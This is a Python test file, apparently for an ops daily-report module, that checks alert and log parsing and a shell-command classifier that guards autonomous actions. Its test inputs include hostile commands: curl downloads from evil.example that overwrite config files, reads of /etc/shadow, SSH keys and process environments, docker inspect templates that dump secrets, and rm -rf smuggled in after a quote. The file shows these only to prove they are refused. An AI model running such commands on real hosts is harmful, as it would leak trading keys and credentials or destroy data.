    """The rules API lists instances in EVERY state, so a rule grouped `by (host, system)` that is
    Alerting on the primary and Normal on the secondary names only the primary -- naming both sends
    the operator to create a silence on a host that never fired."""
    payload = _rules(
        {
            "name": "Capture · venue not online",
            "uid": "zcrypto-capture-venue-not-online",
            "state": "firing",
            "labels": {"severity": "warning"},
            "annotations": {"summary": "Runbook: infra/runbooks/capture.md#zcrypto-capture-venue-not-online"},
            "alerts": [
                {"state": "Normal", "activeAt": None, "labels": {"host": "zcrypto-red"}},
                {"state": "Alerting", "activeAt": "2026-08-29T10:00:00Z", "labels": {"host": "zcrypto"}},
            ],
        }
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload, _EMPTY_HISTORY))
    assert read.firing_now[0].hosts == ("zcrypto",)
    # `active_at` comes from the same filtered set, or a Normal instance's absent one wins by position.
    assert read.firing_now[0].active_at == "2026-08-29T10:00:00Z"


@pytest.mark.parametrize("state", [None, "", "Normal"])
def test_an_instance_the_api_does_not_call_alerting_contributes_no_host(state):
    """Default-DENY on the instance's own state: an instance the code cannot prove is firing names no
    host, and the `[{}]` sentinel is restored after the filter rather than smuggled through it as a
    default."""
    payload = _rules(
        {
            "name": "Capture · venue not online",
            "uid": "zcrypto-capture-venue-not-online",
            "state": "firing",
            "labels": {"severity": "warning"},
            "annotations": {"summary": "Runbook: infra/runbooks/capture.md#zcrypto-capture-venue-not-online"},
            "alerts": [
                {"state": "Alerting", "activeAt": "2026-08-29T10:00:00Z", "labels": {"host": "zcrypto"}},
                {"state": state, "activeAt": "2026-08-29T09:00:00Z", "labels": {"host": "zcrypto-red"}},
            ],
        }
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload, _EMPTY_HISTORY))
    assert read.firing_now[0].hosts == ("zcrypto",)


def test_a_firing_rule_that_arrives_with_no_instances_still_names_its_mapped_host():
    """The synthetic instance standing in for an empty `alerts` array must survive the state filter
    that has no state to read, or `_UID_HOST` -- consulted per instance -- is never consulted."""
    payload = _rules(
        {
            "name": "Alloy dark",
            "uid": "zcrypto-alloy-dark-nas",
            "state": "firing",
            "labels": {"severity": "critical"},
            "annotations": {"summary": "Runbook: infra/runbooks/observability.md#zcrypto-alloy-dark-nas"},
            "alerts": [],
        }
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(payload, _EMPTY_HISTORY))
    assert read.firing_now[0].hosts == ("nas",)


def _history(*transitions):
    """The live frame shape: three columns named by `schema.fields`, identity in `line`."""
    return {
        "schema": {"fields": [{"name": "time"}, {"name": "line"}, {"name": "labels"}]},
        "data": {
            "values": [
                [1787987260000 + i * 1000 for i in range(len(transitions))],
                list(transitions),
                [{} for _ in transitions],
            ]
        },
    }


@pytest.mark.parametrize(
    ("current", "reaches"),
    [
        ("Alerting", True),
        # Drill K measured `Pending (NoData) -> Alerting (NoData)` off this endpoint, and these rules
        # carry `noDataState: Alerting` deliberately, so an exact match on "Alerting" drops them.
        ("Alerting (NoData)", True),
        # `execErrState: Alerting` is Grafana failing to reach its own Prometheus -- 83.5% false over
        # 23 days by the capture runbook's count. Admitting it would move the verdict on a hiccup.
        ("Alerting (Error)", False),
        # An Alerting reason nobody has measured yet costs one report line if admitted and a silent
        # all-clear over a page if dropped, so the filter is a prefix minus Error rather than a list.
        ("Alerting (KeepLast)", True),
        # ... and a compound reason naming Error is still Grafana failing to read its own datasource.
        ("Alerting (Error, KeepLast)", False),
    ],
)
def test_the_history_admits_a_real_firing_and_its_nodata_sentinel_but_not_a_datasource_error(current, reaches):
    rules = _rules(
        {
            "name": "Engine · cycle stale",
            "uid": "zcrypto-engine-cycle-stale",
            "state": "inactive",
            "labels": {"severity": "critical"},
            "annotations": {"summary": "Runbook: infra/runbooks/engine.md#zcrypto-engine-cycle-stale"},
            "alerts": [],
        }
    )
    history = _history({"previous": "Pending", "current": current, "ruleUID": "zcrypto-engine-cycle-stale", "ruleTitle": "t"})
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(rules, history))
    assert bool(read.fired_in_window) is reaches


def test_a_history_alert_takes_the_host_from_its_own_labels():
    """A history row carries its own labels, and `_UID_HOST` names only the handful of rules whose
    expr aggregates the host away -- so falling straight to the map prints `on ?` for most rules."""
    rules = _rules(
        {
            "name": "Gate · exporter stale",
            "uid": "zcrypto-gate-exporter-stale",
            "state": "inactive",
            "labels": {"severity": "critical"},
            "annotations": {"summary": "Runbook: infra/runbooks/gate.md#zcrypto-gate-exporter-stale"},
            "alerts": [],
        }
    )
    history = _history(
        {
            "previous": "Pending",
            "current": "Alerting",
            "ruleUID": "zcrypto-gate-exporter-stale",
            "ruleTitle": "t",
            "labels": {"host": "nas"},
        }
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(rules, history))
    assert read.fired_in_window[0].hosts == ("nas",)


def test_a_history_alert_gathers_every_host_that_fired_not_just_the_first_row():
    """One rule fires once per host, so the history carries a row each: keeping the first row alone
    under-reports a fleet-wide event exactly as reading `instances[0]` did."""
    rules = _rules(
        {
            "name": "Capture · every book stream on a host is silent",
            "uid": "zcrypto-capture-all-streams-silent",
            "state": "inactive",
            "labels": {"severity": "critical"},
            "annotations": {"summary": "Runbook: infra/runbooks/capture.md#zcrypto-capture-all-streams-silent"},
            "alerts": [],
        }
    )
    uid = "zcrypto-capture-all-streams-silent"
    history = _history(
        {"previous": "Normal", "current": "Alerting", "ruleUID": uid, "ruleTitle": "t", "labels": {"host": "zcrypto"}},
        {"previous": "Normal", "current": "Alerting", "ruleUID": uid, "ruleTitle": "t", "labels": {"host": "zcrypto-red"}},
    )
    read = ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=_canned(rules, history))
    assert [a.uid for a in read.fired_in_window] == [uid], "still ONE Alert per rule"
    assert read.fired_in_window[0].hosts == ("zcrypto", "zcrypto-red")


def test_an_alert_still_firing_is_not_also_listed_as_cleared():
    """`fired_in_window` is SEEDED from `firing_now`, so the two overlap by construction; rendering
    it raw prints every standing alert twice and inflates the journal line."""
    still_firing = ops_daily.Alert(
        "zcrypto-capture-venue-not-online", "t", "firing", None, "infra/runbooks/capture.md#x", ("zcrypto",)
    )
    report = _report(alerts=ops_daily.AlertsRead(firing_now=[still_firing], fired_in_window=[still_firing]))
    assert report.markdown().count("zcrypto-capture-venue-not-online") == 1
    assert "fired and cleared" not in report.markdown()


@pytest.mark.parametrize(
    "cmd",
    [
        # Attached and combined short flags: curl accepts every one of these.
        "curl -XDELETE https://healthchecks.io/api/v3/checks/abc",
        "curl -XPOST https://x/api",
        "curl -d{} https://x/api",
        "curl -T/etc/hosts https://x/up",
        "curl -sO https://x/payload",
        # `-o /dev/null` first, so a scan that stops at the first output flag never sees the -X.
        "curl -fsS -o /dev/null -X DELETE https://healthchecks.io/api/v3/checks/abc",
        # DNS is case-insensitive; the ping check must be too.
        "curl https://HC-PING.com/uuid",
        # An interpreter that can shell out, with no redirect for composition to catch.
        "awk 'BEGIN{system(\"rm -rf /tmp/x\")}'",
        # find's siblings of -exec and -delete.
        r"find /var/log -execdir rm -rf {} \;",
        "find / -fprint /var/lib/foo/marker",
        # A backslash-escaped quote: a naive scanner opens a quote span here, treats the real `;` as
        # data, and the `rm` runs.
        "echo \\' ; rm -rf /var/lib/foo",
        "echo \\' & rm -rf /var/lib/foo",
        # An unbalanced quote: bash refuses it, and so must the classifier rather than parsing on.
        'echo "a ; rm -rf /var/lib/foo',
    ],
)
def test_flag_syntax_interpreters_and_escapes_cannot_launder_a_mutation(cmd):
    """Flag syntax, an interpreter and an escape cannot launder a mutation -- the flag lists are
    ALLOWLISTS per command because a denylist misses the attached form, and the lexer is `shlex`
    because a hand-rolled scanner loses to a backslash."""
    assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.PREPARED


@pytest.mark.parametrize(
    "cmd,host",
    [
        ("curl -fsS -m 10 -o /dev/null -w '%{http_code}' https://healthchecks.io/", "ops"),
        ("curl -s http://127.0.0.1:12345/metrics", "ops"),
        ("find /var/lib/zcrypto-capture -name '*.parquet' -mmin -3 -ls", "zcrypto"),
        ("sudo docker exec zcrypto-engine zcrypto engine exec-status", "zcrypto"),
    ],
)
def test_the_real_reads_survive_the_allowlists(cmd, host):
    """The allowlists must still admit the runbooks' own GETs and finds -- a guard that refuses
    everything has moved the outage, not removed it."""
    assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.AUTONOMOUS


@pytest.mark.parametrize(
    "cmd",
    [
        # `curl -o` WRITES the file it names, on the read path that returns AUTONOMOUS before the
        # protected-object veto runs -- naming the unbackfillable capture dir does not stop it.
        "curl -o /var/lib/zcrypto-capture/x.parquet https://evil.example/p",
        "sudo curl -fsS -o /etc/zcrypto/zcrypto.toml https://evil.example/cfg",
        "curl -O https://evil.example/payload",
        "curl --output /tmp/x https://evil.example/p",
        # A Go template reaches the WHOLE object through a bare root reference, so allowlisting the
        # selectors a format mentions is unsound: `{{.Name}}` is safe and `{{json .}}` beside it
        # marshals ContainerJSON, environment included.
        "docker inspect --format '{{.Name}}{{json .}}' zcrypto-engine",
        'docker inspect --format \'{{.Id}}{{index . "Config" "Env"}}\' zcrypto-engine',
        "docker inspect --format '{{json .}}' zcrypto-engine",
        "docker inspect --format='{{.Name}}{{json .}}' zcrypto-engine",
        "docker inspect -f '{{.Name}}{{json .}}' zcrypto-engine",
        "docker inspect --format '{{range .Config.Env}}{{.}}{{end}}' zcrypto-engine",
        # bash reads a command `logs2` redirecting to a file; a raw replace of the noise token turns
        # it into `docker logs zcrypto-engine` and makes the classifier disagree with the shell.
        "docker logs2>/dev/nullzcrypto-engine",
        # A read that surfaces the trade key is the same defect `docker inspect` is guarded against.
        "cat /opt/zcrypto-capture/logship-secrets.env",
        "sudo cat /etc/zcrypto/secrets.env",
        "grep -r KRAKEN /opt/zcrypto-capture/logship-secrets.env",
        "cat infra/ansible/group_vars/all/vault.yml",
        # A glob and a directory carry no secret-shaped token, so a name-matching veto prints the
        # Loki push password through them while every literal filename above reads clean.
        "sudo cat /opt/zcrypto-capture/*",
        "sudo cat /etc/zcrypto-ops/alloy/*",
        "cat /home/deploy/.ssh/*",
        "grep -rF LOKI /etc/zcrypto-ops/",
        "grep -r . /home/deploy/.ssh/",
        # A first-stage grep naming no file walks the working directory, which over `ssh ops` is the
        # deploy user's home, `.ssh/` included -- a read reaching it through no operand at all.
        "grep -r .",
        "grep -r zcrypto",
        "cat /var/log/../opt/zcrypto-capture/logship-secrets.env",
    ],
)
def test_the_round_four_escapes_are_refused(cmd):
    """Curl's writes, a Go template reaching the whole object, and a secret read through a glob, a
    directory or a bare recursion are PREPARED on every host -- the veto is an allowlist of WHERE a
    command may read, never a denylist of secret-looking names."""
    for host in ("zcrypto", "ops", "nas"):
        assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.PREPARED, host


@pytest.mark.parametrize(
    "cmd,host",
    [
        ("curl -fsS -m 10 -o /dev/null -w '%{http_code}\\n' https://healthchecks.io/", "ops"),
        ("sudo docker inspect grafana-alloy --format '{{json .Mounts}}'", "ops"),
        (
            "sudo docker inspect zcrypto-ops-liquidations --format '{{.State.Status}} {{.RestartCount}} {{json .Config.Entrypoint}}'",
            "ops",
        ),
        (
            "sudo docker inspect grafana-alloy --format 'img={{.Config.Image}} restarts={{.RestartCount}} started={{.State.StartedAt}} oom={{.State.OOMKilled}}'",
            "ops",
        ),
        ("sudo ls -la /opt/zcrypto-capture/logship-secrets.env", "zcrypto"),
        ("sha256sum /etc/zcrypto-capture/alloy/conf/config.alloy", "zcrypto"),
        ("cat /var/lib/zcrypto-node-textfile/*.prom", "ops"),
        ("grep -rE '^Storage=' /etc/systemd/journald.conf /etc/systemd/journald.conf.d/", "ops"),
        ("sudo cat /var/lib/zcrypto-engine/exec/kill", "zcrypto"),
        ("cat /mnt/zhao-crypto/.pull-status", "nas"),
        ("grep -A3 group_add /etc/zcrypto-ops/alloy/compose.yaml", "ops"),
        ("sudo docker inspect zcrypto-capture --format 'cpus={{.HostConfig.NanoCpus}} mem={{.HostConfig.Memory}}'", "zcrypto"),
    ],
)
def test_the_round_four_fixes_kept_their_true_positives(cmd, host):
    """The narrow vetoes keep their true positives: `-o` admits `/dev/null` so the dead-man probe
    still runs, the format check grammars the ACTIONS rather than banning `json`, and the secret veto
    covers only heads that print file CONTENT, so `ls -la` still answers a permission check."""
    assert ops_daily.classify_action(cmd, host=host) is ops_daily.Tier.AUTONOMOUS


@pytest.mark.parametrize(
    "cmd",
    [
        "docker restart al*",
        "docker stop *",
        "systemctl restart 'zcrypto-*'",
        "systemctl restart zcrypto-*",
        "systemctl stop 'zcrypto-*.service'",
    ],
)
def test_a_mutating_target_is_never_a_glob(cmd):
    """A glob in a mutating container or unit name turns one authorised restart into a mass one, and
    nothing downstream re-checks what it expanded to."""
    assert ops_daily.classify_action(cmd, host="ops") is ops_daily.Tier.PREPARED


def test_the_read_patterns_the_exact_unit_class_must_not_break():
    assert ops_daily.classify_action("systemctl list-timers 'zcrypto-*'", host="ops") is ops_daily.Tier.AUTONOMOUS
    assert ops_daily.classify_action("systemctl list-units 'zcrypto-*.service' --all", host="ops") is ops_daily.Tier.AUTONOMOUS
    assert ops_daily.classify_action("systemctl restart alloy", host="ops") is ops_daily.Tier.AUTONOMOUS


@pytest.mark.parametrize(
    "cmd",
    [
        "sudo cat /proc/1234/environ",
        "cat /proc/self/environ",
        "grep -r KRAKEN /proc/",
        "cat /sys/class/net/eth0/address",
        "sudo cat /etc/systemd/system/zcrypto-engine.service",
        "cat /var/logsecret/keys.txt",
    ],
)
def test_a_read_safe_root_holds_only_what_was_checked(cmd):
    """A read-safe root holds only what was checked: `cat /proc/<pid>/environ` prints the engine's
    live Kraken trade key, and a unit file can carry `Environment=` inline, so only journald's own
    config is listed -- and a root ending in `/` is not widened by a sibling that merely starts with
    its letters."""
    assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.PREPARED


@pytest.mark.parametrize(
    "cmd",
    [
        "grep -e KRAKEN /opt/zcrypto-capture/logship-secrets.env",
        "grep -e . /opt/zcrypto-capture/logship-secrets.env",
        "sudo grep -e x /home/deploy/.ssh/id_rsa",
        "grep -e X /etc/shadow",
        "grep -in -e ADMIN /etc/zcrypto-ops/alloy/alloy-secrets.env",
        # operand 0 is the secret and operand 1 is safe, so skipping operand 0 passed the command
        "grep -e X /etc/shadow /var/log/syslog",
        "grep --regexp=X /etc/shadow",
        "grep -ie X /etc/shadow",
        # A second `-e` takes the first as its pattern, so real grep reads BOTH operands as files and
        # the one the path check skips is the secret.
        "grep -e -e /etc/shadow /var/log/syslog",
    ],
)
def test_grep_e_does_not_turn_the_first_file_into_the_pattern(cmd):
    """`grep -e X /etc/shadow` must stay PREPARED: no grep shape admits an option that takes the
    pattern, so the operand the path check skips is never a file."""
    assert ops_daily.classify_action(cmd, host="zcrypto") is ops_daily.Tier.PREPARED


def test_the_greps_the_runbooks_actually_run():
    for cmd in (
        "grep -rE '^Storage=' /etc/systemd/journald.conf /etc/systemd/journald.conf.d/",
        "grep -A3 group_add /etc/zcrypto-ops/alloy/compose.yaml",
        "sudo docker logs grafana-alloy --since 1h 2>&1 | grep -iE 'collector|error'",
    ):
        assert ops_daily.classify_action(cmd, host="ops") is ops_daily.Tier.AUTONOMOUS, cmd


def test_the_R_spelling_of_a_recursion_is_admitted_by_no_grep_shape():
    """No grep shape admits `-R`, while the `-r` the runbooks spell reads the same operands
    AUTONOMOUS. The claim is about that one letter, not about dereferencing: a symlink under a
    spelled-safe root is still read by shapes this says nothing about."""
    safe = "'^Storage=' /etc/systemd/journald.conf /etc/systemd/journald.conf.d/"
    for refused, passing in (
        (f"grep -RE {safe}", f"grep -rE {safe}"),
        ("grep -R Storage /var/log/", "grep -r Storage /var/log/"),
        ("grep -sRah X /var/log/", "grep -srah X /var/log/"),
    ):
        assert ops_daily.classify_action(refused, host="ops") is ops_daily.Tier.PREPARED, refused
        assert ops_daily.classify_action(passing, host="ops") is ops_daily.Tier.AUTONOMOUS, passing


@pytest.mark.parametrize(
    ("refused", "passing"),
    [
        # A recursion switch reads a tree no operand names.
        ("grep -r SECRET", "grep -r SECRET /var/log/"),
        # ugrep recurses on an `--include` whose glob holds a `/`, so an admitted FILTER flag reaches
        # that same tree with no recursion switch anywhere in the command.
        ("grep --include='sub/' SECRET", "grep --include='sub/' SECRET /var/log/"),
        ("grep --include='**/*.conf' SECRET", "grep --include='**/*.conf' SECRET /var/log/"),
        # No switch at all: with no file and no stage before it, grep reads a stdin the pass never
        # supplies.
        ("grep SECRET", "grep SECRET /var/log/syslog"),
        ("cat", "cat /var/log/syslog"),
    ],
)
def test_a_first_stage_content_head_naming_no_file_is_refused(refused, passing):
    """A first-stage `cat` or `grep` with an empty file list is PREPARED, and the same command naming
    a read-safe file is AUTONOMOUS: what decides is the file list, never which flag was spelled."""
    assert ops_daily.classify_action(refused, host="ops") is ops_daily.Tier.PREPARED, refused
    assert ops_daily.classify_action(passing, host="ops") is ops_daily.Tier.AUTONOMOUS, passing


@pytest.mark.parametrize(
    ("flag", "spec", "cmd"),
    [
        ("--recursive", None, "grep --recursive SECRET"),
        # `-d recurse` recurses where GNU grep reads it, and takes its mode as a separate word.
        ("-d", ops_daily._NAME, "grep -d recurse SECRET"),
    ],
)
def test_the_refusal_reads_the_file_list_and_not_the_flag_table(monkeypatch, flag, spec, cmd):
    """A grep shape widened to admit a recursion flag no real shape takes still refuses the command
    when it names no file, and still passes it when it names a read-safe one."""
    for unwidened in (cmd, f"{cmd} /var/log/"):
        assert ops_daily.classify_action(unwidened, host="ops") is ops_daily.Tier.PREPARED, f"unwidened: {unwidened}"
    widened = tuple(
        dataclasses.replace(shape, flags={**shape.flags, flag: spec}) if shape.head == ("grep",) else shape
        for shape in ops_daily._FIRST_STAGE_SHAPES
    )
    monkeypatch.setattr(ops_daily, "_FIRST_STAGE_SHAPES", widened)
    assert ops_daily.classify_action(cmd, host="ops") is ops_daily.Tier.PREPARED, cmd
    assert ops_daily.classify_action(f"{cmd} /var/log/", host="ops") is ops_daily.Tier.AUTONOMOUS, cmd


def test_no_shape_table_admits_a_content_head_reading_outside_the_safe_roots(monkeypatch):
    """A table is DISCOVERED off the module, never listed here, and each is given in turn a grep shape
    carrying a `-m` no real shape admits -- the read that reaches `/etc/shadow` stays PREPARED wherever
    the stage it rides sits, and the same read under `/var/log/` passes, so the refusal is the veto's
    and not the injection failing to match."""
    tables = sorted(name for name in vars(ops_daily) if name.endswith("_SHAPES"))
    print("shape tables discovered on ops_daily:", tables)
    assert tables, "no shape table discovered -- the sweep, not the classifier, is what failed"
    injected = ops_daily._Shape(
        ("grep",),
        {"-m": ops_daily._INT},
        arity=(1, 2),
        classes=(ops_daily._PATTERN, ops_daily._FILEREF),
    )
    # The first stage and a pipeline stage are matched against different tables, so the same read is
    # put in both positions: whichever table a name turns out to hold, one of the two consults it.
    positions = ("grep -m 5 X {}", "docker ps | grep -m 5 X {}")
    for name in tables:
        monkeypatch.setattr(ops_daily, name, getattr(ops_daily, name) + (injected,))
        for position in positions:
            cmd = position.format("/etc/shadow")
            assert ops_daily.classify_action(cmd, host="ops") is ops_daily.Tier.PREPARED, (name, cmd)
        assert any(
            ops_daily.classify_action(position.format("/var/log/syslog"), host="ops") is ops_daily.Tier.AUTONOMOUS
            for position in positions
        ), f"{name}: the injected shape matched no stage, so the refusals above prove nothing"
        monkeypatch.undo()


@pytest.mark.parametrize(
    "cmd",
    [
        "cat /etc/systemd/journald.conf.evil",
        "cat /etc/zcrypto-ops/alloy/compose.yamlxsecrets.env",
        "cat /etc/zcrypto-ops/alloy/compose.yaml.bak",
        "cat /etc/machine-id-backup/secrets",
    ],
)
def test_a_single_file_root_does_not_admit_names_that_extend_it(cmd):
    """A file root matches EXACTLY: `/etc/zcrypto-ops/alloy/` holds alloy-secrets.env beside the
    compose file it lists, so a `compose.yaml.bak` admitted by prefix would be a door onto that
    directory."""
    assert ops_daily.classify_action(cmd, host="ops") is ops_daily.Tier.PREPARED


def test_the_exact_file_roots_still_read():
    for cmd in (
        "grep -rE '^Storage=' /etc/systemd/journald.conf /etc/systemd/journald.conf.d/",
        "grep -A3 group_add /etc/zcrypto-ops/alloy/compose.yaml",
        "cat /etc/machine-id",
    ):
        assert ops_daily.classify_action(cmd, host="ops") is ops_daily.Tier.AUTONOMOUS, cmd


def test_every_directory_read_root_ends_in_a_slash():
    """A `_READ_SAFE_DIRS` entry added without its trailing slash silently becomes a prefix again and
    admits every sibling whose name merely extends it -- so dirs end in `/` and files never do."""
    assert all(root.endswith("/") for root in ops_daily._READ_SAFE_DIRS), ops_daily._READ_SAFE_DIRS
    assert not any(f.endswith("/") for f in ops_daily._READ_SAFE_FILES), ops_daily._READ_SAFE_FILES


def test_the_log_read_uses_lokis_query_path_not_prometheuss(monkeypatch):
    """Loki answers under `/loki/api/v1/query`; `/api/v1/query` is Prometheus's and 404s there, so
    this asserts the path and the datasource uid, not the parse."""
    monkeypatch.delenv("GRAFANA_LOKI_DS_UID", raising=False)
    opener = _recording({"data": {"result": []}})
    ops_daily.read_logs("tok", window=DAY, opener=opener)
    assert len(opener.urls) == 1
    assert "/loki/api/v1/query" in opener.urls[0], opener.urls[0]
    assert "/uid/grafanacloud-logs/" in opener.urls[0], opener.urls[0]


def test_the_prometheus_reads_keep_the_prometheus_query_path():
    """The same proxy helper serves both datasources, so widening it for Loki must not move these."""
    opener = _recording({"data": {"result": []}})
    ops_daily.read_verdict("tok", opener=opener)
    assert opener.urls and all("/api/v1/query" in u and "/loki/" not in u for u in opener.urls), opener.urls
    assert all("/uid/grafanacloud-prom/" in u for u in opener.urls), opener.urls


@pytest.mark.parametrize(
    "exc",
    [
        TimeoutError("timed out"),
        ConnectionResetError("reset by peer"),
        http.client.RemoteDisconnected("closed without response"),
        http.client.IncompleteRead(b"half"),
        urllib.error.URLError("dns"),
        urllib.error.HTTPError("u", 502, "bad gateway", {}, None),
    ],
)
def test_a_transport_failure_is_an_unreadable_source_not_a_crash(exc):
    """urllib wraps `OSError` only around the REQUEST, so a transport failure below it escapes a
    `URLError`-only catch and, uncaught, exits 1 -- ATTENTION -- for a source the pass could not
    read, inverting the module's contract."""
    for read, kwargs in (
        (ops_daily.read_logs, {"window": DAY}),
        (ops_daily.read_alerts, {"now": NOW, "window": DAY}),
        (ops_daily.read_deadmen, {}),
        (ops_daily.read_reminders, {"now": NOW, "window": DAY}),
    ):
        result = read("tok", opener=_raises(exc), **kwargs)
        assert result.unreadable, f"{read.__name__} let {type(exc).__name__} escape"


def test_a_verdict_read_that_could_not_be_read_exits_2_not_1():
    """`read_verdict` reports through its checks, so a read it could not make must still reach
    `Report.unreadable` and exit 2 -- an isolated timeout on the verdict query alone otherwise says
    the FLEET is wrong."""
    checks = ops_daily.read_verdict("tok", opener=_raises(TimeoutError("timed out")))
    assert checks and all(c.value.startswith("unreadable:") for c in checks), checks
    report = ops_daily.build_report(
        alerts=ops_daily.AlertsRead(),
        logs=ops_daily.LogsRead(),
        deadmen=ops_daily.DeadmenRead(),
        verdict=checks,
        deploys=[],
        reminders=ops_daily.RemindersRead(),
        now=NOW,
    )
    assert report.unreadable, "a verdict the pass could not read is an unreadable SOURCE"
    assert report.exit_code == 2, report.exit_code


def test_a_healthy_but_empty_verdict_is_not_an_unreadable_source():
    """The true positive the old assertion could not tell apart: `(no series)` is a FAIL, not a gap."""
    checks = ops_daily.read_verdict("tok", opener=_canned({"data": {"result": []}}))
    report = ops_daily.build_report(
        alerts=ops_daily.AlertsRead(),
        logs=ops_daily.LogsRead(),
        deadmen=ops_daily.DeadmenRead(),
        verdict=checks,
        deploys=[],
        reminders=ops_daily.RemindersRead(),
        now=NOW,
    )
    assert not report.unreadable, report.unreadable
    assert report.exit_code == 1, report.exit_code


def test_a_shape_changed_payload_is_an_unreadable_source_not_a_crash():
    """A 200 whose body changed shape is an unreadable source, not a `KeyError` past the guard."""
    bad = {"data": {"result": [{"metric": {}, "vaIue": [0, "1"]}]}}
    assert ops_daily.read_logs("tok", window=DAY, opener=_canned(bad)).unreadable
    checks = ops_daily.read_verdict("tok", opener=_canned(bad))
    assert checks and all(c.value.startswith("unreadable:") for c in checks), checks


def test_a_vault_that_cannot_be_read_exits_2(monkeypatch, capsys):
    """The vault is a source too: a locked GPG agent raises `CalledProcessError`, which `_UNREACHABLE`
    does not cover, so the pass exits 2 and names it rather than exiting 1, the traceback kept on stderr."""

    def boom(*a, **k):
        raise subprocess.CalledProcessError(2, ["vault-pass.sh"])

    monkeypatch.setattr(ops_daily.grafana_auth, "vault_var", boom)
    assert ops_daily.main(["report"]) == 2
    assert "the vault could not be read" in capsys.readouterr().out


def test_a_bad_since_suffix_is_a_usage_error_not_a_traceback():
    assert ops_daily.main(["report", "--since", "24w"]) == 2
    assert ops_daily.main(["report", "--since", "abc"]) == 2


def test_a_truncated_sample_array_is_an_unreadable_source_too():
    """A sample array too short to index is an unreadable source, not an `IndexError` past the parse."""
    truncated = {"data": {"result": [{"metric": {}, "value": [0]}]}}
    assert ops_daily.read_logs("tok", window=DAY, opener=_canned(truncated)).unreadable
    assert ops_daily.read_deadmen("tok", opener=_canned(truncated)).unreadable
    checks = ops_daily.read_verdict("tok", opener=_canned(truncated))
    assert checks and all(c.value.startswith("unreadable:") for c in checks), checks


@pytest.mark.parametrize(
    "schema,values",
    [
        # `time` gone: t_idx falls back to 0 and resolves to the SAME column as `line`, so the
        # dict passes the line check and `stamp / 1000` divides a dict by an int.
        ({"fields": [{"name": "line"}, {"name": "labels"}]}, [[{"ruleUID": "u", "current": "Alerting"}], [{}]]),
        # `time` as RFC3339 strings, the other realistic drift of this frame.
        (
            {"fields": [{"name": "time"}, {"name": "line"}, {"name": "labels"}]},
            [["2026-08-29T02:00:00Z"], [{"ruleUID": "u", "current": "Alerting"}], [{}]],
        ),
    ],
)
def test_a_history_frame_whose_time_column_drifted_is_read_not_fatal(schema, values):
    """A history frame whose `time` column drifted reads as no transitions and no unreadable source:
    `TypeError` sits outside `_UNREACHABLE`, so an unguarded division would take the pass down with
    no report at all."""
    read = ops_daily.read_alerts(
        "tok", now=NOW, window=DAY, opener=_canned(_rules(), {"schema": schema, "data": {"values": values}})
    )
    assert read.unreadable is None
    assert read.fired_in_window == []


def test_every_endpoint_the_instrument_builds_is_pinned(monkeypatch):
    """Every endpoint the module builds is pinned by path and datasource uid -- here, or in
    `test_the_log_read_uses_lokis_query_path_not_prometheuss` and
    `test_the_prometheus_reads_keep_the_prometheus_query_path`. A reader added without a pin is
    caught by nothing but this sentence."""
    monkeypatch.setenv("GRAFANA_LOKI_DS_UID", ops_daily.LOKI_DS_UID_DEFAULT)
    monkeypatch.setattr(ops_daily, "_readonly_key", lambda: "k")

    alerts = _recording(_rules(), _EMPTY_HISTORY)
    ops_daily.read_alerts("tok", now=NOW, window=DAY, opener=alerts)
    assert any(u.endswith("/api/prometheus/grafana/api/v1/rules") for u in alerts.urls), alerts.urls
    history = [u for u in alerts.urls if "/rules/history" in u]
    assert history, alerts.urls
    assert all("from=" in u and "to=" in u and "limit=" in u for u in history), history

    deadmen = _recording({"data": {"result": []}}, {"checks": []})
    ops_daily.read_deadmen("tok", opener=deadmen)
    assert any("/uid/%s/api/v1/query" % ops_daily.PROM_DS_UID in u for u in deadmen.urls), deadmen.urls
    assert any(u == "https://healthchecks.io/api/v3/checks/" for u in deadmen.urls), deadmen.urls
    assert not any("/loki/" in u for u in deadmen.urls), deadmen.urls

    reminders = _recording(_counter(0))
    ops_daily.read_reminders("tok", now=NOW, window=DAY, opener=reminders)
    assert len(reminders.urls) == 2 and all("/uid/%s/api/v1/query" % ops_daily.PROM_DS_UID in u for u in reminders.urls), (
        reminders.urls
    )
    assert "sum(increase(zcrypto_reconcile_healable_gap_seconds_total[24h]))" in urllib.parse.unquote(reminders.urls[0]), (
        reminders.urls
    )
    assert "sum(resets(zcrypto_reconcile_healable_gap_seconds_total[24h]))" in urllib.parse.unquote(reminders.urls[1]), (
        reminders.urls
    )


def test_the_journal_paragraph_carries_warnings_when_there_are_any():
    """The journal paragraph counts WARNING beside ERROR/CRITICAL and keeps the two figures apart --
    a healthy fleet talks in warnings."""
    logs = ops_daily.LogsRead(
        counts=[
            ops_daily.LogCount(host="zcrypto", container="capture", level="WARNING", count=1201),
            ops_daily.LogCount(host="zcrypto-red", container="capture", level="WARNING", count=601),
            # An ERROR beside them, or the LEVEL FILTER is unpinned: summing every count rather than
            # just the warnings survives a WARNING-only fixture.
            ops_daily.LogCount(host="ops", container="liquidations", level="ERROR", count=2),
        ]
    )
    para = ops_daily.build_report(
        alerts=ops_daily.AlertsRead(),
        logs=logs,
        deadmen=ops_daily.DeadmenRead(),
        verdict=[],
        deploys=[],
        reminders=ops_daily.RemindersRead(),
        now=NOW,
    ).journal_paragraph()
    assert "1802 WARNING" in para, para
    assert "2 ERROR/CRITICAL" in para, para


def test_the_journal_paragraph_stays_quiet_when_nothing_warned():
    """The true positive: a genuinely silent day must not grow a clause saying so."""
    para = ops_daily.build_report(
        alerts=ops_daily.AlertsRead(),
        logs=ops_daily.LogsRead(),
        deadmen=ops_daily.DeadmenRead(),
        verdict=[],
        deploys=[],
        reminders=ops_daily.RemindersRead(),
        now=NOW,
    ).journal_paragraph()
    assert "WARNING" not in para, para


# --- spec 00107 D3: the reminders are read from the source that actually knows ------------------------------


def _register(tmp_path, *rows, decoy=True, preamble=False):
    """A register whose log holds `rows` (first-cell, fetched-at), plus by default a dated 2099 table
    after the NEXT heading, which a parser blind to section boundaries reads. Two more placements: the
    un-numbered row sits inside the log and LAST, where only `_LOG_ROW`'s `#\\d+` rejects it, and
